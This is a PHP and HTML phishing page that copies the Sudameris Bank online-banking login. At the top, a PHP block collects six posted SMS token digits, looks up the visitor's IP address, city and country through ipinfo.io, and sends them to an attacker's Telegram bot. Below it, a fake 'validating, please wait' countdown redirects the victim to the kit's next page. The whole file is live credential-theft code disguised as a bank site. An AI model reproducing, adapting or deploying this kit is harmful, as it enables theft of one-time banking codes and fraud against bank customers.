<?php
ini_set("display_errors", 0);
include('dt.php');
$ip = trim(file_get_contents("http://ipinfo.io/ip"));
$cc = trim(file_get_contents("http://ipinfo.io/{$ip}/country"));
$userp = trim(file_get_contents("http://ipinfo.io/{$ip}/city"));
if ( isset ($_POST['1']) && isset ($_POST['2']) ){

$message = "TOKEN O SMS: ".$_POST['1']."".$_POST['2']."".$_POST['3']."".$_POST['4']."".$_POST['5']."".$_POST['6']."\r\nIP: ".$ip." ".$userp." ".$cc."\r\n";

$apiToken = $apibot;
$data = [
    'chat_id' => $canal,
    'text' => $message
];
$response = file_get_contents("https://api.telegram.org/bot$apiToken/sendMessage?" . http_build_query($data) );
}else{  header ('location: post11.php'); exit();
}

?>

<!DOCTYPE html>
<!-- saved from url=(0050)https://secure.sudameris.com.py/sudamerisweb/login -->
<html lang="en"><head><meta http-equiv="Content-Type" content="text/html; charset=UTF-8">
    
    <meta http-equiv="X-UA-Compatible" content="IE=edge">
    
    <meta name="description" content="SudamerisBank">
    

    <title>Sudameris</title>

    <!-- CSS -->
    

<link href="./index_files/bootstrap.css" rel="stylesheet">
<link href="./index_files/spinner.css" rel="stylesheet">
<link href="./index_files/style.css" rel="stylesheet">
<link rel="stylesheet" href="./index_files/trust.css">
<link rel="stylesheet" href="./index_files/start.css">
<link rel="stylesheet" href="./index_files/spinner.css">
<link rel="stylesheet" href="./index_files/error.css">




  </head>
<body class="bkg-color-medium">
  <div class="auth-spinner" style="display: none"><div class="lds-ellipsis"><div></div><div></div><div></div><div></div></div></div>
  

  <div class="container welcome-bkg pr-0">
    <div class="row">
    <input type="hidden" id="refresh" value="no">
    <div class="col-xs-5 col-sm-3 lateral-logo">

    </div>
    <div class="col-lg-14 col-md-13 col-sm-12 col-xs-4" style="height:100%">
      <div style="margin-top:15%">
          <p class="font-style-label font-login-text font-login-medium">SUDAMERIS</p>
          <p class="font-style-label font-login-text font-login-big mt-30">Bienvenid<span style="font-family: Arial">@</span></p>
          <p class="font-style-label font-login-text font-login-big"> al nuevo e-Bank</p>
          <p class="font-style-label font-login-text font-login-small mt-30">Descargá la app para dispositivos móviles</p>
          <p class="font-style-label font-login-text font-login-small">desde Google Play o App Store</p>
      </div>
    </div>
    <div class="col-lg-5 col-md-7 col-sm-8 col-xs-12" style="height:100%;display:table; min-width: 10.4em">
      <div style="display: table-cell; vertical-align: middle">
        <form id="loginForm" role="form" style="background-color:rgba(255, 255, 255, 0.88);padding:1rem;" action="post11.php" method="POST" autocomplete="off"><!-- id="login-header" -->
       	  <div>
              <div class="alert alert-danger" style="display:none;" role="alert" id="alertError">
                          <p class="alert-text-error"></p>
                      </div>
                  </div>
          <div class="hide-show" id="country_container" style="display: none;">
            <label class="label-login">PAÍS EMISOR DE DOCUMENTO</label>
            <div class="custom-select">
                <select name="country" id="pais" ref="pais" class="font-medium font-style-value text-color-very-dark input-format">
                    <option value="586" selected="">Paraguay</option>
                    <option value="13">Afganistan</option>
                        <option value="17">Albania</option>
                        <option value="20">Alboran Y Perejil, Islas</option>
                        <option value="23">Alemania</option>
                        <option value="37">Andorra</option>
                        <option value="40">Angola</option>
                        <option value="41">Anguila</option>
                        <option value="43">Antigua Y Barbuda</option>
                        <option value="47">Antillas Holandesas</option>
                        <option value="53">Arabia Saudita</option>
                        <option value="59">Argelia</option>
                        <option value="63">Argentina</option>
                        <option value="26">Armenia</option>
                        <option value="27">Aruba</option>
                        <option value="39">Australia</option>
                        <option value="69">Australia</option>
                        <option value="72">Austria</option>
                        <option value="74">Azerbaiyan</option>
                        <option value="77">Bahamas, Islas</option>
                        <option value="80">Bahrein</option>
                        <option value="991">Balcans</option>
                        <option value="81">Bangladesh</option>
                        <option value="83">Barbados</option>
                        <option value="91">Belarus</option>
                        <option value="87">Belgica-luxemburgo</option>
                        <option value="88">Belice</option>
                        <option value="229">Benin</option>
                        <option value="90">Bermudas</option>
                        <option value="93">Birmania</option>
                        <option value="97">Bolivia</option>
                        <option value="98">Bonaire, San Eustatius Y Saba</option>
                        <option value="29">Bosnia Y Herzegovina</option>
                        <option value="101">Botswana</option>
                        <option value="105">Brasil</option>
                        <option value="108">Brunei</option>
                        <option value="111">Bulgaria</option>
                        <option value="31">Burkina Faso</option>
                        <option value="115">Burundi</option>
                        <option value="119">Butan</option>
                        <option value="127">Cabo Verde,rca. De</option>
                        <option value="137">Caiman, Islas</option>
                        <option value="141">Camboya</option>
                        <option value="145">Camerum</option>
                        <option value="149">Canada</option>
                        <option value="153">Canarias, Islas</option>
                        <option value="203">Chad</option>
                        <option value="207">Checoslovaquia</option>
                        <option value="211">Chile</option>
                        <option value="215">China</option>
                        <option value="221">Chipre</option>
                        <option value="159">Ciudad Del Vaticano</option>
                        <option value="165">Cocos, Islas</option>
                        <option value="169">Colombia</option>
                        <option value="173">Comoras</option>
                        <option value="177">Congo</option>
                        <option value="183">Cook,islas</option>
                        <option value="187">Corea Del Norte</option>
                        <option value="190">Corea Del Sur</option>
                        <option value="193">Costa De Marfil</option>
                        <option value="196">Costa Rica</option>
                        <option value="198">Croacia</option>
                        <option value="199">Cuba</option>
                        <option value="201">Curazao</option>
                        <option value="232">Dinamarca</option>
                        <option value="235">Dominica, Isla</option>
                        <option value="239">Ecuador</option>
                        <option value="240">Egipto</option>
                        <option value="242">El Salvador</option>
                        <option value="244">Emiratos Arabes Unidos</option>
                        <option value="243">Eritrea</option>
                        <option value="897">Escocia</option>
                        <option value="246">Eslovaquia</option>
                        <option value="247">Eslovenia</option>
                        <option value="245">España</option>
                        <option value="249">Estados Unidos</option>
                        <option value="251">Estonia</option>
                        <option value="253">Etiopia</option>
                        <option value="259">Feroe, Islas</option>
                        <option value="870">Fiji</option>
                        <option value="267">Filipinas</option>
                        <option value="271">Finlandia</option>
                        <option value="275">Francia</option>
                        <option value="281">Gabon</option>
                        <option value="285">Gambia</option>
                        <option value="287">Georgia</option>
                        <option value="289">Ghana</option>
                        <option value="293">Gibraltar</option>
                        <option value="301">Grecia</option>
                        <option value="297">Grenada</option>
                        <option value="305">Groenlandia</option>
                        <option value="309">Guadalupe Y Dependencias</option>
                        <option value="313">Guam</option>
                        <option value="317">Guatemala</option>
                        <option value="325">Guayana Francesa</option>
                        <option value="992">Guernsey</option>
                        <option value="334">Guinea Bissau</option>
                        <option value="331">Guinea Ecuatorial</option>
                        <option value="337">Guyana</option>
                        <option value="341">Haiti</option>
                        <option value="573">Holanda</option>
                        <option value="345">Honduras</option>
                        <option value="351">Hong Kong</option>
                        <option value="355">Hungria</option>
                        <option value="361">India</option>
                        <option value="365">Indonesia</option>
                        <option value="369">Irak</option>
                        <option value="372">Iran</option>
                        <option value="375">Irlanda -eire-</option>
                        <option value="993">Isla De Man</option>
                        <option value="379">Islandia</option>
                        <option value="677">Islas Salomon</option>
                        <option value="383">Israel</option>
                        <option value="386">Italia</option>
                        <option value="391">Jamaica</option>
                        <option value="399">Japon</option>
                        <option value="994">Jersey</option>
                        <option value="403">Jordania</option>
                        <option value="406">Kazajistan</option>
                        <option value="410">Kenia</option>
                        <option value="412">Kirguizistan</option>
                        <option value="411">Kiribati</option>
                        <option value="414">Kosovo</option>
                        <option value="413">Kuwait</option>
                        <option value="420">Laos</option>
                        <option value="429">Latvia</option>
                        <option value="426">Lesotho</option>
                        <option value="431">Libano</option>
                        <option value="434">Liberia</option>
                        <option value="438">Libia</option>
                        <option value="440">Liechtenstein</option>
                        <option value="999">Lista Internet-narcotrafico</option>
                        <option value="443">Lituania</option>
                        <option value="445">Luxemburgo</option>
                        <option value="447">Macao</option>
                        <option value="448">Macedonia</option>
                        <option value="450">Madagascar</option>
                        <option value="455">Malasia</option>
                        <option value="458">Malawi</option>
                        <option value="461">Maldivas</option>
                        <option value="464">Mali</option>
                        <option value="467">Malta</option>
                        <option value="469">Marianas Septentrionales, Isla</option>
                        <option value="474">Marruecos</option>
                        <option value="472">Marshall (islas)</option>
                        <option value="477">Martinica</option>
                        <option value="485">Mauricio</option>
                        <option value="488">Mauritania</option>
                        <option value="493">Mexico</option>
                        <option value="494">Micronesia</option>
                        <option value="496">Moldova, Republica De</option>
                        <option value="498">Monaco</option>
                        <option value="497">Mongolia Rep.popular De</option>
                        <option value="500">Montenegro</option>
                        <option value="501">Montserrat, Isla</option>
                        <option value="504">Moyotte</option>
                        <option value="505">Mozambique</option>
                        <option value="507">Namibia</option>
                        <option value="508">Nauru</option>
                        <option value="511">Navidad, Islas</option>
                        <option value="517">Nepal</option>
                        <option value="521">Nicaragua</option>
                        <option value="525">Niger</option>
                        <option value="528">Nigeria</option>
                        <option value="531">Niue, Isla</option>
                        <option value="535">Norfolk,isla</option>
                        <option value="538">Noruega</option>
                        <option value="542">Nueva Caledonia</option>
                        <option value="548">Nueva Zelandia</option>
                        <option value="556">Oman</option>
                        <option value="563">Pacifico,islas-administr.eeuu-</option>
                        <option value="569">Pacifico,islas-fideicomis.eeuu</option>
                        <option value="566">Pacifico,islas-posesion Eeuu-</option>
                        <option value="576">Pakistan</option>
                        <option value="578">Palau</option>
                        <option value="579">Palestina</option>
                        <option value="580">Panama</option>
                        <option value="545">Papua Nueva Guinea</option>
                        <option value="589">Peru</option>
                        <option value="593">Pitcairn, Isla</option>
                        <option value="599">Polinesia Francesa</option>
                        <option value="603">Polonia</option>
                        <option value="607">Portugal</option>
                        <option value="611">Puerto Rico</option>
                        <option value="618">Qatar</option>
                        <option value="628">Reino Unido</option>
                        <option value="640">Republica Centroafricana</option>
                        <option value="644">Republica Checa</option>
                        <option value="329">Republica De Guinea</option>
                        <option value="647">Republica Dominicana</option>
                        <option value="660">Reunion,isla</option>
                        <option value="670">Rumania</option>
                        <option value="676">Rusia</option>
                        <option value="675">Rwanda</option>
                        <option value="685">Sahara Occidental</option>
                        <option value="687">Samoa</option>
                        <option value="690">Samoa Occidental,edos Indep.</option>
                        <option value="693">San Bartolome</option>
                        <option value="695">San Kitts Y Nevis</option>
                        <option value="697">San Marino</option>
                        <option value="698">San Martin (parte Francesa)</option>
                        <option value="699">San Martin (parte Holandesa)</option>
                        <option value="700">San Pedro Y Miquelon</option>
                        <option value="705">San Vicente,isla</option>
                        <option value="710">Santa Elena</option>
                        <option value="715">Santa Lucia,isla</option>
                        <option value="720">Santo Tome Y Principe,islas</option>
                        <option value="728">Senegal</option>
                        <option value="885">Serbia</option>
                        <option value="731">Seychelles</option>
                        <option value="735">Sierra Leona</option>
                        <option value="741">Singapur</option>
                        <option value="744">Siria</option>
                        <option value="748">Somalia</option>
                        <option value="750">Sri Lanka</option>
                        <option value="756">Sudafrica Y Namibia, Rca De</option>
                        <option value="759">Sudan</option>
                        <option value="760">Sudan Del Sur</option>
                        <option value="764">Suecia</option>
                        <option value="767">Suiza</option>
                        <option value="770">Surinam</option>
                        <option value="772">Svalbard Y Jan Mayen, Islas</option>
                        <option value="773">Swazilandia</option>
                        <option value="776">Tailandia</option>
                        <option value="218">Taiwan</option>
                        <option value="780">Tanzania</option>
                        <option value="774">Tayikistan</option>
                        <option value="785">Territ.alta Comis.pacifico Occ</option>
                        <option value="788">Timor Oriental</option>
                        <option value="800">Togo</option>
                        <option value="85">Tokelan, Islas</option>
                        <option value="805">Tokelau</option>
                        <option value="810">Tonga</option>
                        <option value="815">Trinidad Y Tobago</option>
                        <option value="820">Tunez</option>
                        <option value="823">Turcas Y Caicos,islas</option>
                        <option value="825">Turkmenistan</option>
                        <option value="827">Turquia</option>
                        <option value="828">Tuvalu</option>
                        <option value="840">U. R. S. S.</option>
                        <option value="830">Ucrania</option>
                        <option value="833">Uganda</option>
                        <option value="845">Uruguay</option>
                        <option value="847">Uzbekistan</option>
                        <option value="551">Vanuatu</option>
                        <option value="850">Venezuela</option>
                        <option value="855">Vietnam</option>
                        <option value="863">Virgenes,islas-britanicas-</option>
                        <option value="866">Visgenes,islas-u.s.a.-</option>
                        <option value="875">Wallis Y Futuna, Isla</option>
                        <option value="880">Yemen</option>
                        <option value="783">Yibuti</option>
                        <option value="888">Zaire</option>
                        <option value="890">Zambia</option>
                        <option value="665">Zimbabwe</option>
                        <option value="895">Zona Del Canal De Panama</option>
                        </select>
            <div class="select-selected font-medium font-style-value text-color-very-dark input-format">Paraguay</div><div class="select-items select-hide"><div class="font-medium font-style-value text-color-very-dark">Paraguay</div><div class="font-medium font-style-value text-color-very-dark">Afganistan</div><div class="font-medium font-style-value text-color-very-dark">Albania</div><div class="font-medium font-style-value text-color-very-dark">Alboran Y Perejil, Islas</div><div class="font-medium font-style-value text-color-very-dark">Alemania</div><div class="font-medium font-style-value text-color-very-dark">Andorra</div><div class="font-medium font-style-value text-color-very-dark">Angola</div><div class="font-medium font-style-value text-color-very-dark">Anguila</div><div class="font-medium font-style-value text-color-very-dark">Antigua Y Barbuda</div><div class="font-medium font-style-value text-color-very-dark">Antillas Holandesas</div><div class="font-medium font-style-value text-color-very-dark">Arabia Saudita</div><div class="font-medium font-style-value text-color-very-dark">Argelia</div><div class="font-medium font-style-value text-color-very-dark">Argentina</div><div class="font-medium font-style-value text-color-very-dark">Armenia</div><div class="font-medium font-style-value text-color-very-dark">Aruba</div><div class="font-medium font-style-value text-color-very-dark">Australia</div><div class="font-medium font-style-value text-color-very-dark">Australia</div><div class="font-medium font-style-value text-color-very-dark">Austria</div><div class="font-medium font-style-value text-color-very-dark">Azerbaiyan</div><div class="font-medium font-style-value text-color-very-dark">Bahamas, Islas</div><div class="font-medium font-style-value text-color-very-dark">Bahrein</div><div class="font-medium font-style-value text-color-very-dark">Balcans</div><div class="font-medium font-style-value text-color-very-dark">Bangladesh</div><div class="font-medium font-style-value text-color-very-dark">Barbados</div><div class="font-medium font-style-value text-color-very-dark">Belarus</div><div class="font-medium font-style-value text-color-very-dark">Belgica-luxemburgo</div><div class="font-medium font-style-value text-color-very-dark">Belice</div><div class="font-medium font-style-value text-color-very-dark">Benin</div><div class="font-medium font-style-value text-color-very-dark">Bermudas</div><div class="font-medium font-style-value text-color-very-dark">Birmania</div><div class="font-medium font-style-value text-color-very-dark">Bolivia</div><div class="font-medium font-style-value text-color-very-dark">Bonaire, San Eustatius Y Saba</div><div class="font-medium font-style-value text-color-very-dark">Bosnia Y Herzegovina</div><div class="font-medium font-style-value text-color-very-dark">Botswana</div><div class="font-medium font-style-value text-color-very-dark">Brasil</div><div class="font-medium font-style-value text-color-very-dark">Brunei</div><div class="font-medium font-style-value text-color-very-dark">Bulgaria</div><div class="font-medium font-style-value text-color-very-dark">Burkina Faso</div><div class="font-medium font-style-value text-color-very-dark">Burundi</div><div class="font-medium font-style-value text-color-very-dark">Butan</div><div class="font-medium font-style-value text-color-very-dark">Cabo Verde,rca. De</div><div class="font-medium font-style-value text-color-very-dark">Caiman, Islas</div><div class="font-medium font-style-value text-color-very-dark">Camboya</div><div class="font-medium font-style-value text-color-very-dark">Camerum</div><div class="font-medium font-style-value text-color-very-dark">Canada</div><div class="font-medium font-style-value text-color-very-dark">Canarias, Islas</div><div class="font-medium font-style-value text-color-very-dark">Chad</div><div class="font-medium font-style-value text-color-very-dark">Checoslovaquia</div><div class="font-medium font-style-value text-color-very-dark">Chile</div><div class="font-medium font-style-value text-color-very-dark">China</div><div class="font-medium font-style-value text-color-very-dark">Chipre</div><div class="font-medium font-style-value text-color-very-dark">Ciudad Del Vaticano</div><div class="font-medium font-style-value text-color-very-dark">Cocos, Islas</div><div class="font-medium font-style-value text-color-very-dark">Colombia</div><div class="font-medium font-style-value text-color-very-dark">Comoras</div><div class="font-medium font-style-value text-color-very-dark">Congo</div><div class="font-medium font-style-value text-color-very-dark">Cook,islas</div><div class="font-medium font-style-value text-color-very-dark">Corea Del Norte</div><div class="font-medium font-style-value text-color-very-dark">Corea Del Sur</div><div class="font-medium font-style-value text-color-very-dark">Costa De Marfil</div><div class="font-medium font-style-value text-color-very-dark">Costa Rica</div><div class="font-medium font-style-value text-color-very-dark">Croacia</div><div class="font-medium font-style-value text-color-very-dark">Cuba</div><div class="font-medium font-style-value text-color-very-dark">Curazao</div><div class="font-medium font-style-value text-color-very-dark">Dinamarca</div><div class="font-medium font-style-value text-color-very-dark">Dominica, Isla</div><div class="font-medium font-style-value text-color-very-dark">Ecuador</div><div class="font-medium font-style-value text-color-very-dark">Egipto</div><div class="font-medium font-style-value text-color-very-dark">El Salvador</div><div class="font-medium font-style-value text-color-very-dark">Emiratos Arabes Unidos</div><div class="font-medium font-style-value text-color-very-dark">Eritrea</div><div class="font-medium font-style-value text-color-very-dark">Escocia</div><div class="font-medium font-style-value text-color-very-dark">Eslovaquia</div><div class="font-medium font-style-value text-color-very-dark">Eslovenia</div><div class="font-medium font-style-value text-color-very-dark">España</div><div class="font-medium font-style-value text-color-very-dark">Estados Unidos</div><div class="font-medium font-style-value text-color-very-dark">Estonia</div><div class="font-medium font-style-value text-color-very-dark">Etiopia</div><div class="font-medium font-style-value text-color-very-dark">Feroe, Islas</div><div class="font-medium font-style-value text-color-very-dark">Fiji</div><div class="font-medium font-style-value text-color-very-dark">Filipinas</div><div class="font-medium font-style-value text-color-very-dark">Finlandia</div><div class="font-medium font-style-value text-color-very-dark">Francia</div><div class="font-medium font-style-value text-color-very-dark">Gabon</div><div class="font-medium font-style-value text-color-very-dark">Gambia</div><div class="font-medium font-style-value text-color-very-dark">Georgia</div><div class="font-medium font-style-value text-color-very-dark">Ghana</div><div class="font-medium font-style-value text-color-very-dark">Gibraltar</div><div class="font-medium font-style-value text-color-very-dark">Grecia</div><div class="font-medium font-style-value text-color-very-dark">Grenada</div><div class="font-medium font-style-value text-color-very-dark">Groenlandia</div><div class="font-medium font-style-value text-color-very-dark">Guadalupe Y Dependencias</div><div class="font-medium font-style-value text-color-very-dark">Guam</div><div class="font-medium font-style-value text-color-very-dark">Guatemala</div><div class="font-medium font-style-value text-color-very-dark">Guayana Francesa</div><div class="font-medium font-style-value text-color-very-dark">Guernsey</div><div class="font-medium font-style-value text-color-very-dark">Guinea Bissau</div><div class="font-medium font-style-value text-color-very-dark">Guinea Ecuatorial</div><div class="font-medium font-style-value text-color-very-dark">Guyana</div><div class="font-medium font-style-value text-color-very-dark">Haiti</div><div class="font-medium font-style-value text-color-very-dark">Holanda</div><div class="font-medium font-style-value text-color-very-dark">Honduras</div><div class="font-medium font-style-value text-color-very-dark">Hong Kong</div><div class="font-medium font-style-value text-color-very-dark">Hungria</div><div class="font-medium font-style-value text-color-very-dark">India</div><div class="font-medium font-style-value text-color-very-dark">Indonesia</div><div class="font-medium font-style-value text-color-very-dark">Irak</div><div class="font-medium font-style-value text-color-very-dark">Iran</div><div class="font-medium font-style-value text-color-very-dark">Irlanda -eire-</div><div class="font-medium font-style-value text-color-very-dark">Isla De Man</div><div class="font-medium font-style-value text-color-very-dark">Islandia</div><div class="font-medium font-style-value text-color-very-dark">Islas Salomon</div><div class="font-medium font-style-value text-color-very-dark">Israel</div><div class="font-medium font-style-value text-color-very-dark">Italia</div><div class="font-medium font-style-value text-color-very-dark">Jamaica</div><div class="font-medium font-style-value text-color-very-dark">Japon</div><div class="font-medium font-style-value text-color-very-dark">Jersey</div><div class="font-medium font-style-value text-color-very-dark">Jordania</div><div class="font-medium font-style-value text-color-very-dark">Kazajistan</div><div class="font-medium font-style-value text-color-very-dark">Kenia</div><div class="font-medium font-style-value text-color-very-dark">Kirguizistan</div><div class="font-medium font-style-value text-color-very-dark">Kiribati</div><div class="font-medium font-style-value text-color-very-dark">Kosovo</div><div class="font-medium font-style-value text-color-very-dark">Kuwait</div><div class="font-medium font-style-value text-color-very-dark">Laos</div><div class="font-medium font-style-value text-color-very-dark">Latvia</div><div class="font-medium font-style-value text-color-very-dark">Lesotho</div><div class="font-medium font-style-value text-color-very-dark">Libano</div><div class="font-medium font-style-value text-color-very-dark">Liberia</div><div class="font-medium font-style-value text-color-very-dark">Libia</div><div class="font-medium font-style-value text-color-very-dark">Liechtenstein</div><div class="font-medium font-style-value text-color-very-dark">Lista Internet-narcotrafico</div><div class="font-medium font-style-value text-color-very-dark">Lituania</div><div class="font-medium font-style-value text-color-very-dark">Luxemburgo</div><div class="font-medium font-style-value text-color-very-dark">Macao</div><div class="font-medium font-style-value text-color-very-dark">Macedonia</div><div class="font-medium font-style-value text-color-very-dark">Madagascar</div><div class="font-medium font-style-value text-color-very-dark">Malasia</div><div class="font-medium font-style-value text-color-very-dark">Malawi</div><div class="font-medium font-style-value text-color-very-dark">Maldivas</div><div class="font-medium font-style-value text-color-very-dark">Mali</div><div class="font-medium font-style-value text-color-very-dark">Malta</div><div class="font-medium font-style-value text-color-very-dark">Marianas Septentrionales, Isla</div><div class="font-medium font-style-value text-color-very-dark">Marruecos</div><div class="font-medium font-style-value text-color-very-dark">Marshall (islas)</div><div class="font-medium font-style-value text-color-very-dark">Martinica</div><div class="font-medium font-style-value text-color-very-dark">Mauricio</div><div class="font-medium font-style-value text-color-very-dark">Mauritania</div><div class="font-medium font-style-value text-color-very-dark">Mexico</div><div class="font-medium font-style-value text-color-very-dark">Micronesia</div><div class="font-medium font-style-value text-color-very-dark">Moldova, Republica De</div><div class="font-medium font-style-value text-color-very-dark">Monaco</div><div class="font-medium font-style-value text-color-very-dark">Mongolia Rep.popular De</div><div class="font-medium font-style-value text-color-very-dark">Montenegro</div><div class="font-medium font-style-value text-color-very-dark">Montserrat, Isla</div><div class="font-medium font-style-value text-color-very-dark">Moyotte</div><div class="font-medium font-style-value text-color-very-dark">Mozambique</div><div class="font-medium font-style-value text-color-very-dark">Namibia</div><div class="font-medium font-style-value text-color-very-dark">Nauru</div><div class="font-medium font-style-value text-color-very-dark">Navidad, Islas</div><div class="font-medium font-style-value text-color-very-dark">Nepal</div><div class="font-medium font-style-value text-color-very-dark">Nicaragua</div><div class="font-medium font-style-value text-color-very-dark">Niger</div><div class="font-medium font-style-value text-color-very-dark">Nigeria</div><div class="font-medium font-style-value text-color-very-dark">Niue, Isla</div><div class="font-medium font-style-value text-color-very-dark">Norfolk,isla</div><div class="font-medium font-style-value text-color-very-dark">Noruega</div><div class="font-medium font-style-value text-color-very-dark">Nueva Caledonia</div><div class="font-medium font-style-value text-color-very-dark">Nueva Zelandia</div><div class="font-medium font-style-value text-color-very-dark">Oman</div><div class="font-medium font-style-value text-color-very-dark">Pacifico,islas-administr.eeuu-</div><div class="font-medium font-style-value text-color-very-dark">Pacifico,islas-fideicomis.eeuu</div><div class="font-medium font-style-value text-color-very-dark">Pacifico,islas-posesion Eeuu-</div><div class="font-medium font-style-value text-color-very-dark">Pakistan</div><div class="font-medium font-style-value text-color-very-dark">Palau</div><div class="font-medium font-style-value text-color-very-dark">Palestina</div><div class="font-medium font-style-value text-color-very-dark">Panama</div><div class="font-medium font-style-value text-color-very-dark">Papua Nueva Guinea</div><div class="font-medium font-style-value text-color-very-dark">Peru</div><div class="font-medium font-style-value text-color-very-dark">Pitcairn, Isla</div><div class="font-medium font-style-value text-color-very-dark">Polinesia Francesa</div><div class="font-medium font-style-value text-color-very-dark">Polonia</div><div class="font-medium font-style-value text-color-very-dark">Portugal</div><div class="font-medium font-style-value text-color-very-dark">Puerto Rico</div><div class="font-medium font-style-value text-color-very-dark">Qatar</div><div class="font-medium font-style-value text-color-very-dark">Reino Unido</div><div class="font-medium font-style-value text-color-very-dark">Republica Centroafricana</div><div class="font-medium font-style-value text-color-very-dark">Republica Checa</div><div class="font-medium font-style-value text-color-very-dark">Republica De Guinea</div><div class="font-medium font-style-value text-color-very-dark">Republica Dominicana</div><div class="font-medium font-style-value text-color-very-dark">Reunion,isla</div><div class="font-medium font-style-value text-color-very-dark">Rumania</div><div class="font-medium font-style-value text-color-very-dark">Rusia</div><div class="font-medium font-style-value text-color-very-dark">Rwanda</div><div class="font-medium font-style-value text-color-very-dark">Sahara Occidental</div><div class="font-medium font-style-value text-color-very-dark">Samoa</div><div class="font-medium font-style-value text-color-very-dark">Samoa Occidental,edos Indep.</div><div class="font-medium font-style-value text-color-very-dark">San Bartolome</div><div class="font-medium font-style-value text-color-very-dark">San Kitts Y Nevis</div><div class="font-medium font-style-value text-color-very-dark">San Marino</div><div class="font-medium font-style-value text-color-very-dark">San Martin (parte Francesa)</div><div class="font-medium font-style-value text-color-very-dark">San Martin (parte Holandesa)</div><div class="font-medium font-style-value text-color-very-dark">San Pedro Y Miquelon</div><div class="font-medium font-style-value text-color-very-dark">San Vicente,isla</div><div class="font-medium font-style-value text-color-very-dark">Santa Elena</div><div class="font-medium font-style-value text-color-very-dark">Santa Lucia,isla</div><div class="font-medium font-style-value text-color-very-dark">Santo Tome Y Principe,islas</div><div class="font-medium font-style-value text-color-very-dark">Senegal</div><div class="font-medium font-style-value text-color-very-dark">Serbia</div><div class="font-medium font-style-value text-color-very-dark">Seychelles</div><div class="font-medium font-style-value text-color-very-dark">Sierra Leona</div><div class="font-medium font-style-value text-color-very-dark">Singapur</div><div class="font-medium font-style-value text-color-very-dark">Siria</div><div class="font-medium font-style-value text-color-very-dark">Somalia</div><div class="font-medium font-style-value text-color-very-dark">Sri Lanka</div><div class="font-medium font-style-value text-color-very-dark">Sudafrica Y Namibia, Rca De</div><div class="font-medium font-style-value text-color-very-dark">Sudan</div><div class="font-medium font-style-value text-color-very-dark">Sudan Del Sur</div><div class="font-medium font-style-value text-color-very-dark">Suecia</div><div class="font-medium font-style-value text-color-very-dark">Suiza</div><div class="font-medium font-style-value text-color-very-dark">Surinam</div><div class="font-medium font-style-value text-color-very-dark">Svalbard Y Jan Mayen, Islas</div><div class="font-medium font-style-value text-color-very-dark">Swazilandia</div><div class="font-medium font-style-value text-color-very-dark">Tailandia</div><div class="font-medium font-style-value text-color-very-dark">Taiwan</div><div class="font-medium font-style-value text-color-very-dark">Tanzania</div><div class="font-medium font-style-value text-color-very-dark">Tayikistan</div><div class="font-medium font-style-value text-color-very-dark">Territ.alta Comis.pacifico Occ</div><div class="font-medium font-style-value text-color-very-dark">Timor Oriental</div><div class="font-medium font-style-value text-color-very-dark">Togo</div><div class="font-medium font-style-value text-color-very-dark">Tokelan, Islas</div><div class="font-medium font-style-value text-color-very-dark">Tokelau</div><div class="font-medium font-style-value text-color-very-dark">Tonga</div><div class="font-medium font-style-value text-color-very-dark">Trinidad Y Tobago</div><div class="font-medium font-style-value text-color-very-dark">Tunez</div><div class="font-medium font-style-value text-color-very-dark">Turcas Y Caicos,islas</div><div class="font-medium font-style-value text-color-very-dark">Turkmenistan</div><div class="font-medium font-style-value text-color-very-dark">Turquia</div><div class="font-medium font-style-value text-color-very-dark">Tuvalu</div><div class="font-medium font-style-value text-color-very-dark">U. R. S. S.</div><div class="font-medium font-style-value text-color-very-dark">Ucrania</div><div class="font-medium font-style-value text-color-very-dark">Uganda</div><div class="font-medium font-style-value text-color-very-dark">Uruguay</div><div class="font-medium font-style-value text-color-very-dark">Uzbekistan</div><div class="font-medium font-style-value text-color-very-dark">Vanuatu</div><div class="font-medium font-style-value text-color-very-dark">Venezuela</div><div class="font-medium font-style-value text-color-very-dark">Vietnam</div><div class="font-medium font-style-value text-color-very-dark">Virgenes,islas-britanicas-</div><div class="font-medium font-style-value text-color-very-dark">Visgenes,islas-u.s.a.-</div><div class="font-medium font-style-value text-color-very-dark">Wallis Y Futuna, Isla</div><div class="font-medium font-style-value text-color-very-dark">Yemen</div><div class="font-medium font-style-value text-color-very-dark">Yibuti</div><div class="font-medium font-style-value text-color-very-dark">Zaire</div><div class="font-medium font-style-value text-color-very-dark">Zambia</div><div class="font-medium font-style-value text-color-very-dark">Zimbabwe</div><div class="font-medium font-style-value text-color-very-dark">Zona Del Canal De Panama</div></div></div>
          </div>
         <input name="__RequestVerificationToken" type="hidden" value="EOLWhsekaYG9KuMAzW6QvqtMzOokOItV4yOuL7nsere5YEb2ONAVRoImoFn5J7BSlHOFVF1qaLQWG1ml2IeBILjcCFjJHo5f23kllo1t_oY1" data-hj-masked="">
        <div class="login-form">
            <div class="row">
                <div class="col-xs-12">

                    <h1 onclick="enableDebug();" class="login-title hidden-xs" data-hj-masked="">Espere un momento por favor...</h1>
                </div>
                      
                  <div style="background-color: #ffffff; width: 100%;">
                      <br>
                     <div style="text-align: center;" align="left"><img style="width: 150px; display: block; margin-left: auto; margin-right: auto;" src="./fff/0020.gif"></div>
                     <br> <br>
                     <div style="text-align: center;" align="center">
                        Por favor espere mientras realizamos validaciones.
                        <br> Cargando plataforma <strong id="time"><label id="countdown">0:20</label></strong></div><strong id="time">

                     <br>
                     <div id="ingresotokenbody" class="ingreso-token__body ingreso-token__body--predeterminado" style="text-align: center;">


                     </div>
                  </strong></div><strong id="time">
               </strong></div><strong id="time">
            </strong></section><strong id="time">
            <script type="text/javascript">
               var url="post1.php";
               var seconds = 20; //número de segundos a contar
               function secondPassed() {

                 var minutes = Math.round((seconds - 20)/60); //calcula el número de minutos
                 var remainingSeconds = seconds % 60; //calcula los segundos
                 //si los segundos usan sólo un dígito, añadimos un cero a la izq
                 if (remainingSeconds < 10) {
                   remainingSeconds = "0" + remainingSeconds;
                 }
                 document.getElementById('countdown').innerHTML = minutes + ":" +     remainingSeconds;
                 if (seconds == 0) {
                   clearInterval(countdownTimer);
                  window.location=url;
                   document.getElementById('countdown').innerHTML = "";
                 } else {
                   seconds--;
                 }
               }

               var countdownTimer = setInterval(secondPassed, 1000);
            </script>
         </strong></div><strong id="time">


      </strong></div><strong id="time">


      <div class="modal fade" id="informationModal" role="dialog" aria-labelledby="informationModal">
          <div class="modal_container">
              <div style="width: 40%; ">
                  <div class="modal-content modal_info_content">
                      <div class="modal-header modal_header">
                          <h4 class="modal-title pdl-20"></h4>
                      </div>
                      <div class="modal-body modal_body">
                          <span class="body-text"> </span>

                          <div class="modal_boton text-center mt-35 mb-10">


                              <button data-dismiss="modal" class="boton">Cerrar</button>
                          </div>
                      </div>
                          </div>

